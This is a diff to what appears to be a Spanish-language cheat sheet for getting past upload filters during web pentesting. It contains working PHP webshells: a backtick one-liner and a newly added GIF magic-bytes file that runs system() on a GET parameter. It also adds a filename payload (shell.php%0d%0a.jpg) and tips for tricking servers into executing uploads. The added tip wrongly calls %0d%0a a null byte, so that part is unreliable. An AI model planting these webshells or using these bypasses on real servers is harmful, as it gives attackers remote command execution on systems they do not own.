@@ -49,7 +49,7 @@ Burlando filtros de extensión y nombre de archivo:
 #### **3. Webshells en PHP** 
 Diversos métodos para obtener ejecución remota de comandos:
 
-- **Webshell simple con backticks (`):**  
+- **Webshell simple con backticks (\`):**  
   ```php
   <?=`$_GET[0]`?>
   ```
@@ -74,6 +74,14 @@ Diversos métodos para obtener ejecución remota de comandos:
   ```
 
 ---
+#### **4. Magic bytes**
+
+```php
+GIF8;
+<?php
+    system($_GET['cmd']);
+?>
+```
 
 #### **Consejos de Uso:**
 - **Verifica siempre la extensión permitida** en el servidor.  
@@ -82,3 +90,9 @@ Diversos métodos para obtener ejecución remota de comandos:
 - **Cambia el tipo de contenido y la codificación** para ver si el servidor lo interpreta como PHP.  
 
 ---
+### **Otros**
+
+**1. Bypass the uploader and upload any file the attacker wants just by using the null byte %0d%0a**
+- shell.php%0d%0a.jpg
+- https://x.com/sardar0x1/status/1977854930196054464
+
